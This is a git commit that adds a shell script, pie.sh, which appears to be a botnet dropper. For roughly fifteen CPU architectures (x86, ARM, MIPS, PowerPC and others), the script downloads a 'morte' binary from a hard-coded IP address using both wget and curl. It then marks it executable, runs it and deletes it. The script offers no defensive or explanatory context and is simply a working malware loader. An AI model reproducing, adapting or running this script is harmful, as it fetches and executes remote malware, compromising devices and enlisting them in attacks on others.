175afedf8f57933820cf6c0c9b8cdfe68af82c20
xykx <151014459+xyakaix@users.noreply.github.com>
2025-09-26 16:55:39 +0900

    Add files via upload

---
+++ pie.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.x86; curl -O http://89.213.174.225/00101010101001/morte.x86; chmod +x *; ./morte.x86 morte.x86; rm -rf morte.x86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.mips; curl -O http://89.213.174.225/00101010101001/morte.mips; chmod +x *; ./morte.mips morte.mips; rm -rf morte.mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.arc; curl -O http://89.213.174.225/00101010101001/morte.arc; chmod +x *; ./morte.arc morte.arc; rm -rf morte.arc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.i468; curl -O http://89.213.174.225/00101010101001/morte.i468; chmod +x *; ./morte.i468 morte.i468; rm -rf morte.i468
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.i686; curl -O http://89.213.174.225/00101010101001/morte.i686; chmod +x *; ./morte.i686 morte.i686; rm -rf morte.i686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.x86_64; curl -O http://89.213.174.225/00101010101001/morte.x86_64; chmod +x *; ./morte.x86_64 morte.x86_64; rm -rf morte.x86_64
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.mpsl; curl -O http://89.213.174.225/00101010101001/morte.mpsl; chmod +x *; ./morte.mpsl morte.mpsl; rm -rf morte.mpsl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.arm; curl -O http://89.213.174.225/00101010101001/morte.arm; chmod +x *; ./morte.arm morte.arm; rm -rf morte.arm
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.arm5; curl -O http://89.213.174.225/00101010101001/morte.arm5; chmod +x *; ./morte.arm5 morte.arm5; rm -rf morte.arm5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.arm6; curl -O http://89.213.174.225/00101010101001/morte.arm6; chmod +x *; ./morte.arm6 morte.arm6; rm -rf morte.arm6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.arm7; curl -O http://89.213.174.225/00101010101001/morte.arm7; chmod +x *; ./morte.arm7 morte.arm7; rm -rf morte.arm7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.ppc; curl -O http://89.213.174.225/00101010101001/morte.ppc; chmod +x *; ./morte.ppc morte.ppc; rm -rf morte.ppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.spc; curl -O http://89.213.174.225/00101010101001/morte.spc; chmod +x *; ./morte.spc morte.spc; rm -rf morte.spc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.m68k; curl -O http://89.213.174.225/00101010101001/morte.m68k; chmod +x *; ./morte.m68k morte.m68k; rm -rf morte.m68k
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.213.174.225/00101010101001/morte.sh4; curl -O http://89.213.174.225/00101010101001/morte.sh4; chmod +x *; ./morte.sh4 morte.sh4; rm -rf morte.sh4
